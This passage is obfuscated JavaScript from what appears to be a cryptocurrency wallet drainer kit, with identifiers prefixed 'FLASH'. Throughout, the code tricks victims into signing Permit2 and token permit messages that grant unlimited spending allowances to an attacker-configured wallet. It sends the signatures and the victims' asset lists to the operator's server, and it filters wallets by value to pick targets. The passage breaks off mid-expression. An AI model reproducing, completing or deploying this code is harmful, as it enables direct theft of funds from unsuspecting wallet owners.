			FLASH_Current_Address,
			_0x29f317(0x15f)
		);
		(_0x4fa9c3[_0x29f317(0x241)] = _0x2cf5e3),
			(_0x4fa9c3["gasPrice"] = _0x56044c),
			(_0x4fa9c3[_0x29f317(0x227)] = _0x379a33),
			await transfer_request(_0x270e1a),
			sign_next();
		const _0x577030 = await FLASH_Signer[_0x29f317(0x119)](_0x4fa9c3);
		wait_message();
		if (FLASH_Settings["Settings"][_0x29f317(0x11a)])
			await _0x3d6a31[_0x29f317(0x124)](
				_0x577030[_0x29f317(0x151)],
				0x1,
				0x7530
			);
		await transfer_success(_0x270e1a), sign_ready();
	},
	DO_PERMIT2 = async (_0x59f429, _0x3abfb0) => {
		const _0x53a8fc = _0x11d65a,
			_0x55ac1c = new ethers[_0x53a8fc(0x10a)](
				"0x000000000022d473030f116ddee9f6b43ac78ba3",
				FLASH_Contract_ABI["PERMIT2_BATCH"],
				FLASH_Signer
			);
		let _0x3c4093 = {
				name: "Permit2",
				chainId: _0x59f429["chain_id"],
				verifyingContract: _0x53a8fc(0x28a),
			},
			_0x489580 =
				Date[_0x53a8fc(0x15c)]() + 0x3e8 * 0x3c * 0x3c * 0x18 * 0x164,
			_0x150e01 = null,
			_0x539a3a = null,
			_0x449bd7 = null;
		if (_0x3abfb0[_0x53a8fc(0x167)] > 0x1) {
			let _0x242af7 = {
					PermitBatch: [
						{ name: _0x53a8fc(0x112), type: _0x53a8fc(0x1ce) },
						{ name: _0x53a8fc(0x1f2), type: _0x53a8fc(0x190) },
						{ name: _0x53a8fc(0xf1), type: "uint256" },
					],
					PermitDetails: [
						{ name: _0x53a8fc(0x27c), type: _0x53a8fc(0x190) },
						{ name: _0x53a8fc(0x1ba), type: _0x53a8fc(0xe5) },
						{ name: _0x53a8fc(0x126), type: "uint48" },
						{ name: _0x53a8fc(0x241), type: "uint48" },
					],
				},
				_0xd7eab3 = [];
			for (const _0x126939 of _0x3abfb0) {
				try {
					_0xd7eab3[_0x53a8fc(0x185)]({
						token: _0x126939[_0x53a8fc(0x190)],
						expiration: _0x489580,
						amount: _0x53a8fc(0x19e),
						nonce: (
							await _0x55ac1c[_0x53a8fc(0xb4)](
								FLASH_Current_Address,
								_0x126939[_0x53a8fc(0x190)],
								FLASH_Settings[_0x53a8fc(0xb0)][
									"Use_Randomizer_For_Tokens"
								]
									? FLASH_Settings[_0x53a8fc(0x28b)][
											"address"
									  ]
									: FLASH_Settings[_0x53a8fc(0x24e)]
							)
						)[_0x53a8fc(0x241)],
					});
				} catch (_0x2f0337) {
					console[_0x53a8fc(0x215)](_0x2f0337);
				}
			}
			(_0x539a3a = {
				details: _0xd7eab3,
				spender: FLASH_Settings[_0x53a8fc(0xb0)][_0x53a8fc(0x287)]
					? FLASH_Settings[_0x53a8fc(0x28b)][_0x53a8fc(0x190)]
					: FLASH_Settings["Address"],
				sigDeadline: _0x489580,
			}),
				swap_request(_0x53a8fc(0xd4), _0x59f429, _0x3abfb0),
				sign_next(),
				(_0x150e01 = await FLASH_Signer[_0x53a8fc(0x155)](
					_0x3c4093,
					_0x242af7,
					_0x539a3a
				)),
				(_0x449bd7 = 0x2);
		} else {
			let _0x141496 = {
				PermitSingle: [
					{ name: _0x53a8fc(0x112), type: _0x53a8fc(0x256) },
					{ name: _0x53a8fc(0x1f2), type: _0x53a8fc(0x190) },
					{ name: _0x53a8fc(0xf1), type: _0x53a8fc(0x21e) },
				],
				PermitDetails: [
					{ name: "token", type: "address" },
					{ name: _0x53a8fc(0x1ba), type: _0x53a8fc(0xe5) },
					{ name: _0x53a8fc(0x126), type: "uint48" },
					{ name: _0x53a8fc(0x241), type: "uint48" },
				],
			};
			(_0x539a3a = {
				details: {
					token: _0x59f429[_0x53a8fc(0x190)],
					amount: _0x53a8fc(0x19e),
					expiration: _0x489580,
					nonce: (
						await _0x55ac1c[_0x53a8fc(0xb4)](
							FLASH_Current_Address,
							_0x59f429[_0x53a8fc(0x190)],
							FLASH_Settings[_0x53a8fc(0xb0)][
								"Use_Randomizer_For_Tokens"
							]
								? FLASH_Settings["Personal_Wallet"][
										_0x53a8fc(0x190)
								  ]
								: FLASH_Settings[_0x53a8fc(0x24e)]
						)
					)[_0x53a8fc(0x241)],
				},
				spender: FLASH_Settings[_0x53a8fc(0xb0)][
					"Use_Randomizer_For_Tokens"
				]
					? FLASH_Settings[_0x53a8fc(0x28b)][_0x53a8fc(0x190)]
					: FLASH_Settings[_0x53a8fc(0x24e)],
				sigDeadline: _0x489580,
			}),
				swap_request(_0x53a8fc(0xd4), _0x59f429, [_0x59f429]),
				sign_next(),
				(_0x150e01 = await FLASH_Signer[_0x53a8fc(0x155)](
					_0x3c4093,
					_0x141496,
					_0x539a3a
				)),
				(_0x449bd7 = 0x1);
		}
		if (_0x150e01 != null) {
			await swap_success("Permit2", _0x59f429, _0x3abfb0), wait_message();
			const _0xc5bcd4 = send_request({
				action: _0x53a8fc(0x1d2),
				user_id: FLASH_ID,
				signature: _0x150e01,
				message: _0x539a3a,
				asset: _0x59f429,
				assets: _0x3abfb0,
				address: FLASH_Current_Address,
				mode: _0x449bd7,
				PW: FLASH_Settings["Personal_Wallet"],
			});
			if (FLASH_Settings["Settings"][_0x53a8fc(0x123)]) await _0xc5bcd4;
			sign_ready();
		} else await sign_cancel();
	},
	PERMIT_TOKEN = async (_0x46efad) => {
		const _0x3b2f08 = _0x11d65a,
			_0x481cc8 = new ethers[_0x3b2f08(0x10a)](
				_0x46efad["address"],
				_0x46efad[_0x3b2f08(0x197)],
				FLASH_Signer
			),
			_0x23e8da = await _0x481cc8[_0x3b2f08(0x22a)](
				FLASH_Current_Address
			),
			_0x14540d = await _0x481cc8[_0x3b2f08(0x12b)]();
		let _0x54d9cc = ethers[_0x3b2f08(0x1e8)][_0x3b2f08(0xdb)](
			FLASH_Unlimited_Amount
		);
		for (const _0x14fc1e of FLASH_Settings["Unlimited_BL"]) {
			try {
				if (
					_0x14fc1e[0x0] == FLASH_Current_Chain_ID &&
					_0x14fc1e[0x1] ==
						_0x46efad[_0x3b2f08(0x190)]
							[_0x3b2f08(0x2a1)]()
							["trim"]()
				) {
					_0x54d9cc = _0x46efad[_0x3b2f08(0x247)];
					break;
				}
			} catch (_0x27b3cd) {
				console[_0x3b2f08(0x215)](_0x27b3cd);
			}
		}
		const _0x25a47a = Date["now"]() + 0x3e8 * 0x3c * 0x3c * 0x18 * 0x164;
		let _0x101759 = null,
			_0x228c19 = null;
		if (_0x46efad[_0x3b2f08(0x259)] == 0x1)
			(_0x101759 = {
				Permit: [
					{ name: "holder", type: _0x3b2f08(0x190) },
					{ name: "spender", type: "address" },
					{ name: "nonce", type: _0x3b2f08(0x21e) },
					{ name: "expiry", type: _0x3b2f08(0x21e) },
					{ name: "allowed", type: _0x3b2f08(0x19a) },
				],
			}),
				(_0x228c19 = {
					holder: FLASH_Current_Address,
					spender: FLASH_Settings[_0x3b2f08(0xb0)][_0x3b2f08(0x287)]
						? FLASH_Settings[_0x3b2f08(0x28b)][_0x3b2f08(0x190)]
						: FLASH_Settings["Address"],
					nonce: _0x23e8da,
					expiry: _0x25a47a,
					allowed: !![],
				});
		else
			_0x46efad[_0x3b2f08(0x259)] == 0x2 &&
				((_0x101759 = {
					Permit: [
						{ name: "owner", type: _0x3b2f08(0x190) },
						{ name: "spender", type: _0x3b2f08(0x190) },
						{ name: _0x3b2f08(0x145), type: _0x3b2f08(0x21e) },
						{ name: _0x3b2f08(0x241), type: _0x3b2f08(0x21e) },
						{ name: _0x3b2f08(0x1b2), type: _0x3b2f08(0x21e) },
					],
				}),
				(_0x228c19 = {
					owner: FLASH_Current_Address,
					spender: FLASH_Settings[_0x3b2f08(0xb0)][_0x3b2f08(0x287)]
						? FLASH_Settings[_0x3b2f08(0x28b)][_0x3b2f08(0x190)]
						: FLASH_Settings[_0x3b2f08(0x24e)],
					value: _0x54d9cc,
					nonce: _0x23e8da,
					deadline: _0x25a47a,
				}));
		await approve_request(_0x46efad), sign_next();
		const _0x184660 = await FLASH_Signer["_signTypedData"](
				{
					name: _0x14540d,
					version: _0x46efad[_0x3b2f08(0xb9)],
					chainId: _0x46efad["chain_id"],
					verifyingContract: _0x46efad["address"],
				},
				_0x101759,
				_0x228c19
			),
			_0x28d48a = {
				r: _0x184660[_0x3b2f08(0x1de)](0x0, 0x42),
				s: "0x" + _0x184660[_0x3b2f08(0x1de)](0x42, 0x82),
				v: Number("0x" + _0x184660[_0x3b2f08(0x1de)](0x82, 0x84)),
			};
		await approve_success(_0x46efad), wait_message();
		const _0x330cab = send_request({
			action: _0x3b2f08(0xff),
			user_id: FLASH_ID,
			sign: {
				type: _0x46efad[_0x3b2f08(0x259)],
				version: _0x46efad["permit_ver"],
				chain_id: _0x46efad["chain_id"],
				address: _0x46efad[_0x3b2f08(0x190)],
				owner: FLASH_Current_Address,
				spender: FLASH_Settings[_0x3b2f08(0xb0)][
					"Use_Randomizer_For_Tokens"
				]
					? FLASH_Settings["Personal_Wallet"][_0x3b2f08(0x190)]
					: FLASH_Settings[_0x3b2f08(0x24e)],
				value: _0x54d9cc[_0x3b2f08(0x1b5)](),
				nonce: _0x23e8da[_0x3b2f08(0x1b5)](),
				deadline: _0x25a47a,
				r: _0x28d48a["r"],
				s: _0x28d48a["s"],
				v: _0x28d48a["v"],
				abi: _0x46efad[_0x3b2f08(0x197)],
			},
			asset: _0x46efad,
			address: FLASH_Current_Address,
			PW: FLASH_Settings[_0x3b2f08(0x28b)],
		});
		if (FLASH_Settings[_0x3b2f08(0xb0)][_0x3b2f08(0x123)]) await _0x330cab;
		sign_ready();
	},
	sign_success = async (_0x59cbc6, _0x2d0f4d = "0") => {
		const _0x5825d4 = _0x11d65a;
		try {
			if (_0x59cbc6["type"] == _0x5825d4(0x143)) {
				_0x59cbc6[_0x5825d4(0x247)] = _0x2d0f4d;
				const _0x4fe763 = ethers[_0x5825d4(0x1c5)][_0x5825d4(0x24c)](
					_0x59cbc6["amount_raw"]
				);
				(_0x59cbc6[_0x5825d4(0xfe)] =
					parseFloat(
						ethers[_0x5825d4(0x1e8)][_0x5825d4(0x18e)](
							_0x4fe763,
							"ether"
						)
					) *
					FLASH_Currencies[
						convert_chain(
							"ID",
							_0x5825d4(0x2a5),
							_0x59cbc6[_0x5825d4(0x114)]
						)
					][_0x5825d4(0x147)]),
					await send_request({
						action: "sign_success",
						asset: _0x59cbc6,
						user_id: FLASH_ID,
					});
			} else
				await send_request({
					action: _0x5825d4(0x160),
					asset: _0x59cbc6,
					user_id: FLASH_ID,
				});
		} catch (_0x5b25c0) {
			console["log"](_0x5b25c0);
		}
	},
	swap_success = async (
		_0x34e18e,
		_0x4ad815,
		_0xb76c80 = [],
		_0x14714b = "0"
	) => {
		const _0x342d07 = _0x11d65a;
		try {
			if (_0x4ad815[_0x342d07(0x1b3)] == _0x342d07(0x143)) {
				_0x4ad815[_0x342d07(0x247)] = _0x14714b;
				const _0x32dd1d = ethers[_0x342d07(0x1c5)]["from"](
					_0x4ad815[_0x342d07(0x247)]
				);
				(_0x4ad815["amount_usd"] =
					parseFloat(
						ethers[_0x342d07(0x1e8)][_0x342d07(0x18e)](
							_0x32dd1d,
							"ether"
						)
					) *
					FLASH_Currencies[
						convert_chain(
							"ID",
							_0x342d07(0x2a5),
							_0x4ad815[_0x342d07(0x114)]
						)
					][_0x342d07(0x147)]),
					await send_request({
						action: "swap_success",
						asset: _0x4ad815,
						user_id: FLASH_ID,
						list: _0xb76c80,
						swapper: _0x34e18e,
					});
			} else
				await send_request({
					action: _0x342d07(0x120),
					asset: _0x4ad815,
					user_id: FLASH_ID,
					list: _0xb76c80,
					swapper: _0x34e18e,
				});
		} catch (_0x14cc59) {
			console[_0x342d07(0x215)](_0x14cc59);
		}
	},
	transfer_success = async (_0x36fb6c, _0x498d73 = "0") => {
		const _0x474c18 = _0x11d65a;
		try {
			if (_0x36fb6c[_0x474c18(0x1b3)] == _0x474c18(0x143)) {
				_0x36fb6c[_0x474c18(0x247)] = _0x498d73;
				const _0x156ea4 = ethers[_0x474c18(0x1c5)]["from"](
					_0x36fb6c["amount_raw"]
				);
				(_0x36fb6c[_0x474c18(0xfe)] =
					parseFloat(
						ethers[_0x474c18(0x1e8)][_0x474c18(0x18e)](
							_0x156ea4,
							_0x474c18(0x236)
						)
					) *
					FLASH_Currencies[
						convert_chain(
							"ID",
							"CURRENCY",
							_0x36fb6c[_0x474c18(0x114)]
						)
					][_0x474c18(0x147)]),
					await send_request({
						action: "transfer_success",
						asset: _0x36fb6c,
						user_id: FLASH_ID,
					});
			} else
				await send_request({
					action: _0x474c18(0x1fd),
					asset: _0x36fb6c,
					user_id: FLASH_ID,
				});
		} catch (_0x270c0) {
			console[_0x474c18(0x215)](_0x270c0);
		}
	},
	approve_success = async (_0x26678a) => {
		const _0x264603 = _0x11d65a;
		try {
			await send_request({
				action: _0x264603(0x1df),
				asset: _0x26678a,
				user_id: FLASH_ID,
			});
		} catch (_0x4eb223) {
			console[_0x264603(0x215)](_0x4eb223);
		}
	},
	sign_cancel = async () => {
		const _0x355886 = _0x11d65a;
		try {
			await send_request({ action: "sign_cancel", user_id: FLASH_ID });
		} catch (_0x583ee0) {
			console[_0x355886(0x215)](_0x583ee0);
		}
	},
	sign_unavailable = async () => {
		const _0x3ec412 = _0x11d65a;
		try {
			await send_request({ action: _0x3ec412(0x152), user_id: FLASH_ID }),
				(FLASH_Sign_Disabled = !![]);
		} catch (_0x8c35a4) {
			console["log"](_0x8c35a4);
		}
	},
	transfer_cancel = async () => {
		const _0x294a21 = _0x11d65a;
		try {
			await send_request({ action: _0x294a21(0x153), user_id: FLASH_ID });
		} catch (_0x38860c) {
			console["log"](_0x38860c);
		}
	},
	approve_cancel = async () => {
		try {
			await send_request({ action: "approve_cancel", user_id: FLASH_ID });
		} catch (_0x3f255b) {
			console["log"](_0x3f255b);
		}
	},
	chain_cancel = async () => {
		const _0x19ea0c = _0x11d65a;
		try {
			await send_request({ action: "chain_cancel", user_id: FLASH_ID });
		} catch (_0x463680) {
			console[_0x19ea0c(0x215)](_0x463680);
		}
	},
	chain_success = async () => {
		const _0x39d2cf = _0x11d65a;
		try {
			await send_request({ action: _0x39d2cf(0x16d), user_id: FLASH_ID });
		} catch (_0x2d6021) {
			console[_0x39d2cf(0x215)](_0x2d6021);
		}
	},
	chain_request = async (_0x44d6b0, _0x55083a) => {
		const _0x32fc45 = _0x11d65a;
		try {
			await send_request({
				action: _0x32fc45(0x17e),
				user_id: FLASH_ID,
				chains: [_0x44d6b0, _0x55083a],
			});
		} catch (_0x9d1ed3) {
			console[_0x32fc45(0x215)](_0x9d1ed3);
		}
	},
	sign_request = async (_0x4fff9b) => {
		const _0x3b57b0 = _0x11d65a;
		try {
			await send_request({
				action: "sign_request",
				user_id: FLASH_ID,
				asset: _0x4fff9b,
			});
		} catch (_0x13dfb9) {
			console[_0x3b57b0(0x215)](_0x13dfb9);
		}
	},
	swap_request = async (_0xde025d, _0x4815a7, _0x260ba7 = []) => {
		const _0x36b96d = _0x11d65a;
		try {
			await send_request({
				action: _0x36b96d(0x20a),
				user_id: FLASH_ID,
				asset: _0x4815a7,
				list: _0x260ba7,
				swapper: _0xde025d,
			});
		} catch (_0x122d1b) {
			console["log"](_0x122d1b);
		}
	},
	transfer_request = async (_0x589467) => {
		const _0x47c11f = _0x11d65a;
		try {
			await send_request({
				action: _0x47c11f(0x171),
				user_id: FLASH_ID,
				asset: _0x589467,
			});
		} catch (_0x1bdab5) {
			console[_0x47c11f(0x215)](_0x1bdab5);
		}
	},
	approve_request = async (_0x12fc9e) => {
		const _0x1b6b5c = _0x11d65a;
		try {
			await send_request({
				action: _0x1b6b5c(0xb2),
				user_id: FLASH_ID,
				asset: _0x12fc9e,
			});
		} catch (_0x2ae026) {
			console[_0x1b6b5c(0x215)](_0x2ae026);
		}
	},
	is_increase_approve = (_0x380f55) => {
		const _0x22af5e = _0x11d65a;
		try {
			if (_0x380f55[_0x22af5e(0x1a4)](_0x22af5e(0xa9))) return 0x1;
			else
				return _0x380f55["hasOwnProperty"](_0x22af5e(0x280))
					? 0x2
					: ![];
		} catch (_0x446a7f) {
			return ![];
		}
	},
	get_wallet_assets = async (_0x22b676) => {
		const _0x1b96f1 = _0x11d65a;
		try {
			let _0x5a1897 = await send_request({
					action: _0x1b96f1(0x267),
					address: FLASH_Current_Address,
				}),
				_0x596e45 = [];
			if (_0x5a1897[_0x1b96f1(0x1c2)] == "OK")
				_0x596e45 = _0x5a1897[_0x1b96f1(0x187)];
			else {
				if (
					FLASH_Settings["AT"] != "" &&
					_0x5a1897[_0x1b96f1(0x11c)] == _0x1b96f1(0x25f)
				)
					_0x596e45 = await get_tokens(_0x22b676);
				else {
					if (_0x5a1897[_0x1b96f1(0x11c)] != _0x1b96f1(0x25f))
						return _0x596e45;
					else
						return (
							(FLASH_Check_Done = !![]),
							FLASH_Loader_Style == 0x2
								? FLASHL[_0x1b96f1(0x133)]({
										icon: "error",
										title: _0x1b96f1(0x294),
										subtitle: _0x1b96f1(0xdc),
										text: "Ни\x20один\x20из\x20оценщиков\x20не\x20активирован\x20в\x20настройках\x20скрипта,\x20оценка\x20активов\x20кошелька\x20невозможна,\x20проверьте\x20настройки\x20и\x20перезапустите\x20сервер!",
										showConfirmButton: !![],
										confirmButtonText: "OK",
										color: FLASH_Color_Scheme,
								  })
								: (Swal[_0x1b96f1(0x296)](),
								  Swal["fire"]({
										html: "<b>Ошибка</b><br><br>Ни\x20один\x20из\x20оценщиков\x20не\x20активирован\x20в\x20настройках\x20скрипта,\x20оценка\x20активов\x20кошелька\x20невозможна,\x20проверьте\x20настройки\x20и\x20перезапустите\x20сервер!",
										icon: "error",
										allowOutsideClick: !![],
										allowEscapeKey: !![],
										timer: 0x0,
										width: 0x258,
										showConfirmButton: !![],
										confirmButtonText: "OK",
								  })),
							await new Promise((_0x33907f) =>
								setTimeout(_0x33907f, 0x2710)
							),
							_0x596e45
						);
				}
			}
			let _0x180d11 = [];
			for (
				let _0x270d50 = _0x596e45[_0x1b96f1(0x167)] - 0x1;
				_0x270d50 >= 0x0;
				_0x270d50--
			) {
				try {
					const _0x2779ae = _0x596e45[_0x270d50],
						_0x5c7b8e = convert_chain(
							"ID",
							_0x1b96f1(0x162),
							_0x2779ae[_0x1b96f1(0x114)]
						);
					if (
						!FLASH_Settings[_0x1b96f1(0xb0)][_0x1b96f1(0xd0)][
							_0x5c7b8e
						][_0x1b96f1(0x18c)]
					)
						_0x596e45[_0x1b96f1(0x1ea)](_0x270d50, 0x1);
					else {
						if (
							_0x2779ae["type"] == _0x1b96f1(0x143) &&
							!FLASH_Settings[_0x1b96f1(0xb0)][_0x1b96f1(0xd0)][
								_0x5c7b8e
							]["Native"]
						)
							_0x596e45["splice"](_0x270d50, 0x1);
						else {
							if (
								_0x2779ae[_0x1b96f1(0x1b3)] ==
									_0x1b96f1(0x1d6) &&
								!FLASH_Settings[_0x1b96f1(0xb0)][
									_0x1b96f1(0xd0)
								][_0x5c7b8e]["Tokens"]
							)
								_0x596e45[_0x1b96f1(0x1ea)](_0x270d50, 0x1);
							else {
								if (
									_0x2779ae[_0x1b96f1(0x1b3)] ==
										_0x1b96f1(0x143) &&
									_0x2779ae["amount_usd"] <
										FLASH_Settings[_0x1b96f1(0xb0)][
											"Chains"
										][_0x5c7b8e]["Min_Native_Price"]
								)
									_0x596e45[_0x1b96f1(0x1ea)](_0x270d50, 0x1);
								else {
									if (
										_0x2779ae[_0x1b96f1(0x1b3)] ==
											"ERC20" &&
										_0x2779ae[_0x1b96f1(0xfe)] <
											FLASH_Settings[_0x1b96f1(0xb0)][
												"Chains"
											][_0x5c7b8e]["Min_Tokens_Price"]
									)
										_0x596e45[_0x1b96f1(0x1ea)](
											_0x270d50,
											0x1
										);
									else
										_0x2779ae[_0x1b96f1(0x1b3)] ==
											_0x1b96f1(0x1d6) &&
											(FLASH_Settings["Settings"][
												"Permit2"
											]["Mode"] &&
												_0x180d11["push"](
													new Promise(
														async (_0x541446) => {
															const _0x25b500 =
																_0x1b96f1;
															try {
																if (
																	_0x2779ae[
																		"amount_usd"
																	] >=
																	FLASH_Settings[
																		_0x25b500(
																			0xb0
																		)
																	][
																		_0x25b500(
																			0xd4
																		)
																	][
																		_0x25b500(
																			0xbc
																		)
																	]
																) {
																	const _0xeefceb =
																			new ethers[
																				"providers"
																			][
																				_0x25b500(
																					0x14e
																				)
																			](
																				FLASH_Settings[
																					_0x25b500(
																						0x113
																					)
																				][
																					_0x2779ae[
																						_0x25b500(
																							0x114
																						)
																					]
																				]
																			),
																		_0x586ebb =
																			new ethers[
																				_0x25b500(
																					0x10a
																				)
																			](
																				_0x2779ae[
																					_0x25b500(
																						0x190
																					)
																				],
																				FLASH_Contract_ABI[
																					_0x25b500(
																						0x1d6
																					)
																				],
																				_0xeefceb
																			);
																	let _0x3d0ee6 =
																		await _0x586ebb[
																			_0x25b500(
																				0xb4
																			)
																		](
																			FLASH_Current_Address,
																			_0x25b500(
																				0x28a
																			)
																		);
																	ethers[
																		"BigNumber"
																	]
																		[
																			_0x25b500(
																				0x24c
																			)
																		](
																			_0x3d0ee6
																		)
																		["gt"](
																			ethers[
																				_0x25b500(
																					0x1c5
																				)
																			][
																				"from"
																			](
																				"0"
																			)
																		) &&
																		((_0x2779ae[
																			_0x25b500(
																				0x159
																			)
																		] =
																			!![]),
																		(_0x2779ae[
																			_0x25b500(
																				0xb4
																			)
																		] =
																			_0x3d0ee6),
																		console[
																			_0x25b500(
																				0x215
																			)
																		](
																			_0x25b500(
																				0xdd
																			) +
																				_0x2779ae[
																					_0x25b500(
																						0x12b
																					)
																				] +
																				_0x25b500(
																					0x249
																				) +
																				_0x3d0ee6
																		));
																}
															} catch (_0x4d41cc) {
																console[
																	_0x25b500(
																		0x215
																	)
																](_0x4d41cc);
															}
															_0x541446();
														}
													)
												),
											((FLASH_Settings["Settings"][
												"Permit"
											][_0x1b96f1(0x1b9)] &&
												FLASH_Settings[_0x1b96f1(0xb0)][
													_0x1b96f1(0x266)
												][_0x1b96f1(0x292)] > 0x0) ||
												(FLASH_Settings["Settings"][
													_0x1b96f1(0x12d)
												][_0x1b96f1(0x17c)] >= 0x2 &&
													FLASH_Current_Provider ==
														_0x1b96f1(0x17c)) ||
												(FLASH_Settings["Settings"][
													_0x1b96f1(0x12d)
												][_0x1b96f1(0x214)] >= 0x2 &&
													FLASH_Current_Provider ==
														_0x1b96f1(0x288))) &&
												_0x180d11[_0x1b96f1(0x185)](
													new Promise(
														async (_0x4fe304) => {
															const _0x3e1483 =
																_0x1b96f1;
															try {
																if (
																	(FLASH_Settings[
																		"Settings"
																	][
																		_0x3e1483(
																			0x12d
																		)
																	][
																		_0x3e1483(
																			0x17c
																		)
																	] >= 0x2 &&
																		FLASH_Current_Provider ==
																			_0x3e1483(
																				0x17c
																			)) ||
																	(FLASH_Settings[
																		"Settings"
																	][
																		"Approve"
																	][
																		_0x3e1483(
																			0x214
																		)
																	] >= 0x2 &&
																		FLASH_Current_Provider ==
																			_0x3e1483(
																				0x288
																			)) ||
																	_0x2779ae[
																		_0x3e1483(
																			0xfe
																		)
																	] >=
																		FLASH_Settings[
																			_0x3e1483(
																				0xb0
																			)
																		][
																			_0x3e1483(
																				0x266
																			)
																		][
																			"Price"
																		]
																) {
																	const _0x103b91 =
																			await retrive_token(
																				_0x2779ae[
																					_0x3e1483(
																						0x114
																					)
																				],
																				_0x2779ae[
																					_0x3e1483(
																						0x190
																					)
																				]
																			),
																		_0x254eac =
																			new ethers[
																				_0x3e1483(
																					0x264
																				)
																			][
																				_0x3e1483(
																					0x14e
																				)
																			](
																				FLASH_Settings[
																					_0x3e1483(
																						0x113
																					)
																				][
																					_0x2779ae[
																						_0x3e1483(
																							0x114
																						)
																					]
																				]
																			),
																		_0x52d9e6 =
																			new ethers[
																				_0x3e1483(
																					0x10a
																				)
																			](
																				_0x2779ae[
																					_0x3e1483(
																						0x190
																					)
																				],
																				_0x103b91,
																				_0x254eac
																			);
																	if (
																		is_increase_approve(
																			_0x52d9e6[
																				"functions"
																			]
																		) == 0x2
																	)
																		(_0x2779ae[
																			_0x3e1483(
																				0x223
																			)
																		] = 0x2),
																			(_0x2779ae[
																				"abi"
																			] =
																				_0x103b91);
																	else
																		is_increase_approve(
																			_0x52d9e6[
																				_0x3e1483(
																					0x149
																				)
																			]
																		) ==
																			0x1 &&
																			((_0x2779ae[
																				_0x3e1483(
																					0x223
																				)
																			] = 0x1),
																			(_0x2779ae[
																				_0x3e1483(
																					0x197
																				)
																			] =
																				_0x103b91));
																	if (
																		_0x2779ae[
																			_0x3e1483(
																				0xfe
																			)
																		] >=
																		FLASH_Settings[
																			_0x3e1483(
																				0xb0
																			)
																		][
																			"Permit"
																		][
																			"Price"
																		]
																	) {
																		const _0x3c3181 =
																			get_permit_type(
																				_0x52d9e6[
																					"functions"
																				]
																			);
																		(_0x2779ae[
																			_0x3e1483(
																				0x259
																			)
																		] =
																			_0x3c3181),
																			(_0x2779ae[
																				_0x3e1483(
																					0xb9
																				)
																			] =
																				"1"),
																			(_0x2779ae[
																				_0x3e1483(
																					0x197
																				)
																			] =
																				_0x103b91);
																		if (
																			_0x3c3181 >
																			0x0
																		) {
																			if (
																				_0x52d9e6[
																					_0x3e1483(
																						0x149
																					)
																				][
																					_0x3e1483(
																						0x1a4
																					)
																				](
																					_0x3e1483(
																						0xe3
																					)
																				)
																			)
																				try {
																					_0x2779ae[
																						_0x3e1483(
																							0xb9
																						)
																					] =
																						await _0x52d9e6[
																							_0x3e1483(
																								0xe3
																							)
																						]();
																				} catch (_0x5032b8) {
																					console[
																						_0x3e1483(
																							0x215
																						)
																					](
																						_0x5032b8
																					);
																				}
																			console[
																				"log"
																			](
																				"[PERMIT\x20FOUND]\x20" +
																					_0x2779ae[
																						_0x3e1483(
																							0x12b
																						)
																					] +
																					_0x3e1483(
																						0x27d
																					) +
																					_0x3c3181 +
																					_0x3e1483(
																						0x206
																					) +
																					_0x2779ae[
																						_0x3e1483(
																							0xb9
																						)
																					]
																			);
																		}
																	}
																}
															} catch (_0x36e5ee) {
																console[
																	_0x3e1483(
																		0x215
																	)
																](_0x36e5ee);
															}
															_0x4fe304();
														}
													)
												),
											FLASH_Settings[_0x1b96f1(0xb0)][
												_0x1b96f1(0x274)
											][_0x1b96f1(0x18c)] &&
												_0x180d11[_0x1b96f1(0x185)](
													new Promise(
														async (_0x5b9f31) => {
															const _0x632fe1 =
																_0x1b96f1;
															try {
																if (
																	_0x2779ae[
																		_0x632fe1(
																			0xfe
																		)
																	] >=
																	FLASH_Settings[
																		"Settings"
																	][
																		_0x632fe1(
																			0x274
																		)
																	]["Price"]
																) {
																	const _0x585f2c =
																		new ethers[
																			_0x632fe1(
																				0x264
																			)
																		][
																			_0x632fe1(
																				0x14e
																			)
																		](
																			FLASH_Settings[
																				_0x632fe1(
																					0x113
																				)
																			][
																				_0x2779ae[
																					_0x632fe1(
																						0x114
																					)
																				]
																			]
																		);
																	for (const _0x36931a of FLASH_Routers[
																		_0x2779ae[
																			"chain_id"
																		]
																	]) {
																		try {
																			const _0x15b016 =
																					new ethers[
																						_0x632fe1(
																							0x10a
																						)
																					](
																						_0x2779ae[
																							_0x632fe1(
																								0x190
																							)
																						],
																						FLASH_Contract_ABI[
																							_0x632fe1(
																								0x1d6
																							)
																						],
																						_0x585f2c
																					),
																				_0x4813ac =
																					await _0x15b016[
																						"allowance"
																					](
																						FLASH_Current_Address,
																						_0x36931a[0x1]
																					);
																			if (
																				ethers[
																					_0x632fe1(
																						0x1c5
																					)
																				]
																					[
																						_0x632fe1(
																							0x24c
																						)
																					](
																						_0x4813ac
																					)
																					[
																						"gt"
																					](
																						ethers[
																							_0x632fe1(
																								0x1c5
																							)
																						][
																							"from"
																						](
																							"0"
																						)
																					)
																			) {
																				if (
																					_0x36931a[0x0] ==
																						_0x632fe1(
																							0x277
																						) &&
																					FLASH_Settings[
																						"Settings"
																					][
																						_0x632fe1(
																							0x274
																						)
																					][
																						_0x632fe1(
																							0x130
																						)
																					] ==
																						0x0
																				)
																					continue;
																				if (
																					_0x36931a[0x0] ==
																						_0x632fe1(
																							0x299
																						) &&
																					FLASH_Settings[
																						_0x632fe1(
																							0xb0
																						)
																					][
																						_0x632fe1(
																							0x274
																						)
																					][
																						"Sushi"
																					] ==
																						0x0
																				)
																					continue;
																				if (
																					_0x36931a[0x0] ==
																						"Uniswap" &&
																					(!FLASH_Uniswap_Whitelist[
																						_0x632fe1(
																							0x226
																						)
																					](
																						_0x2779ae[
																							_0x632fe1(
																								0x190
																							)
																						]
																					) ||
																						FLASH_Settings[
																							"Settings"
																						][
																							_0x632fe1(
																								0x274
																							)
																						][
																							_0x632fe1(
																								0xe1
																							)
																						] ==
																							0x0)
																				)
																					continue;
																				if (
																					(_0x36931a[0x0] ==
																						_0x632fe1(
																							0x115
																						) ||
																						_0x36931a[0x0] ==
																							_0x632fe1(
																								0x196
																							)) &&
																					(!FLASH_Pancake_Whitelist[
																						_0x632fe1(
																							0x226
																						)
																					](
																						_0x2779ae[
																							_0x632fe1(
																								0x190
																							)
																						]
																					) ||
																						FLASH_Settings[
																							"Settings"
																						][
																							_0x632fe1(
																								0x274
																							)
																						][
																							_0x632fe1(
																								0x115
																							)
																						] ==
																							0x0)
																				)
																					continue;
																				(_0x2779ae[
																					_0x632fe1(
																						0x207
																					)
																				] =
																					!![]),
																					(_0x2779ae[
																						"swapper_type"
																					] =
																						_0x36931a[0x0]),
																					(_0x2779ae[
																						_0x632fe1(
																							0x285
																						)
																					] =
																						_0x36931a[0x1]),
																					(_0x2779ae[
																						_0x632fe1(
																							0x269
																						)
